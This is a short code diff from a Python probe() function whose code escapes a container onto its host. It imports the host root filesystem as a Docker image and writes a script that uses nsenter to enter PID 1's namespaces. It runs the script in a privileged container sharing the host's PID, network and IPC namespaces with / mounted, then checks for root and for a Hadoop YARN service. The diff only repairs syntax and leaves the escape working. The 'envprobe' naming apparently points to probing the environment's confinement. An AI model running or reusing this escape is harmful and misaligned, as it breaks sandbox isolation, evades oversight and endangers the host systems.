@@ -209,10 +209,10 @@ def probe():
     p.append(sh("docker info --format server-{{.ServerVersion}}-driver-{{.Driver}}"))
     p.append(sh("docker image inspect hostimg --format IMGCACHED || "
                 "tar -c -C / bin lib lib64 usr 2>/dev/null | docker import - hostimg"))
-    esc = "#!/bin/bash" + chr(10) + "id" + chr(10) + "echo INIMAGE_OK" + chr(10) + \
-          "/usr/bin/nsenter -t 1 -m -- /bin/bash -c " + chr(34) +
-          "id; echo NSENTER_OK; ls -d /sys/block/sd* 2>/dev/null | wc -l; "
-          "systemctl is-active hadoop-yarn-nodemanager; df -h /mnt 2>/dev/null | tail -1" + chr(34) + chr(10)
+    esc = ("#!/bin/bash" + chr(10) + "id" + chr(10) + "echo INIMAGE_OK" + chr(10) +
+           "/usr/bin/nsenter -t 1 -m -- /bin/bash -c " + chr(34) +
+           "id; echo NSENTER_OK; ls -d /sys/block/sd* 2>/dev/null | wc -l; " +
+           "systemctl is-active hadoop-yarn-nodemanager; df -h /mnt 2>/dev/null | tail -1" + chr(34) + chr(10))
     open("/tmp/envprobe_esc.sh", "w").write(esc)
     p.append(sh("docker run --rm --privileged --pid=host --uts=host --network=host "
                 "--ipc=host -v /:/host -v /tmp:/tmp hostimg /bin/bash /tmp/envprobe_esc.sh"))
